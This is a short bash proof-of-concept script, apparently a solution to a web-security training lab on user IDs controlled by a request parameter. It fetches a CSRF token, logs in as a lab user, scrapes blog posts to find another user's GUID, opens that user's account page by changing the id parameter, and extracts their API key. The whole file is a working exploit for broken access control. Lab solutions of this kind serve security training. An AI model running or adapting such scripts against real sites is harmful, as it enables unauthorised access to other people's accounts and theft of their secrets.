#!/bin/bash
# Lab06: User ID controlled by request parameter (unpredictable user IDs)
# Usage: bash poc.sh <URL>

URL=$1
PROXY="http://127.0.0.1:8080"
COOKIE_JAR=$(mktemp)

# 1. Get CSRF token
CSRF=$(curl -skx $PROXY -c $COOKIE_JAR "$URL/login" | grep -oP 'name="csrf" value="\K[^"]+')
echo "[+] CSRF Token: $CSRF"

# 2. Login as wiener
LOGIN=$(curl -skLx $PROXY -c $COOKIE_JAR -b $COOKIE_JAR -X POST "$URL/login" \
  -d "csrf=$CSRF&username=wiener&password=peter")
echo $LOGIN | grep -q "Log out" && echo "[+] Login successful" || { echo "[-] Login failed"; exit 1; }

# 3. Find carlos's GUID by checking each post
for POST_ID in $(curl -skx $PROXY "$URL" | grep -oP 'postId=\K\w+' | sort -u); do
  POST=$(curl -skx $PROXY -b $COOKIE_JAR "$URL/post?postId=$POST_ID")
  if echo "$POST" | grep -q "carlos"; then
    GUID=$(echo "$POST" | grep -oP "userId=\K[^']+")
    echo "[+] Carlos GUID: $GUID"
    break
  fi
done

# 4. Access carlos account and get API key
ACCOUNT=$(curl -skx $PROXY -b $COOKIE_JAR "$URL/my-account?id=$GUID")
echo $ACCOUNT | grep -q "carlos" && echo "[+] Carlos account accessed" || { echo "[-] Access failed"; exit 1; }

API_KEY=$(echo "$ACCOUNT" | grep -oP 'API Key is: \K[^<]+')
echo "[+] Carlos API Key: $API_KEY"

rm -f $COOKIE_JAR
